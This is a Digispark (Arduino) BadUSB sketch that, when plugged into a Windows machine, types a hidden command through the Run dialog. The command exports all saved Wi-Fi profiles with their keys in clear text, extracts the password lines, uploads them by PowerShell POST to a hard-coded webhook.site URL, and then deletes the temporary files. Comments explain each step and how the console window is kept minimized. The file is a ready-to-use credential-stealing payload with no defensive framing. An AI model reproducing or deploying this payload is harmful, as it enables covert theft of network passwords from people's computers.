/*
  Following payload will grab saved Wifi password and will send them to your hosted webhook and hide the cmd windows by using technique mentioned in hak5darren
 rubberducky wiki -- Payload hide cmd window [https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---hide-cmd-window]
*/


#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100); 
  
  //do all the cool stuff wo delays && minimized
  /* 
    cmd /c start /min cmd /q /c "..."
    :: starts a new minimized console window that closes after finishing the code "..."
    
    cd %temp% & md w & cd w 
    :: create and enter %temp%\w
    
    netsh wlan export profile key=clear 
    :: export wifi info to xml
    
    findstr ial * >> p 
    :: find all lines in all files that contain ial as in keyMaterial
    :: not spelling it out bc there is a character limit in the run.exe window
    :: that's also why we use findstr here instead of the powershell function
    
    powershell Invoke-WebRequest -Uri https://webhook.site/<YOUR-ID> -Method Post -InFile p 
    :: send file to webhook
      
    cd .. & rd w /s /q
    :: clean up 
    
  */
  DigiKeyboard.println("cmd /c start /min cmd /q /c \"cd %temp% & md w & cd w & netsh wlan export profile key=clear & findstr ial * >> p & powershell Invoke-WebRequest -Uri https://webhook.site/73683655-e294-488f-82d1-754435266cb2 -Method Post -InFile p & cd .. & rd w /s /q\""); 
  
  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
